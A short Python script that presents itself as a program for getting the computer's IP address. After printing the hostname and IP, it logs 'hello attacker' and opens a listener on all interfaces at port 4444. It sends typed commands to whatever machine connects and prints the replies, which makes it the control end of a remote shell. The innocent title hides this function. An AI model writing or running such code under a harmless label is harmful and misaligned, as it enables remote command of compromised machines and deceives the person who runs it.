# Python Program to Get IP Address
import socket
import logging
import time

def main():
    # Configure logging
    logging.basicConfig(level=logging.INFO)

    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)

    logging.info("Your Computer Name is: %s", hostname)
    logging.info("Your Computer IP Address is: %s", IPAddr)

    logging.warning("hello attacker")

    start_server()

def start_server(host='0.0.0.0', port=4444):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((host, port))
        server_socket.listen()
        print(f'Server listening on {host}:{port}')
        
        conn, addr = server_socket.accept()
        with conn:
            print(f'Connected by {addr}')
            while True:
                command = input("> ")
                conn.sendall(command.encode("utf-8"))

                data = conn.recv(1024)
                if not data:
                    break
                print(f'Received: {data.decode()}')

                time.sleep(3)

if __name__ == "__main__":
    main()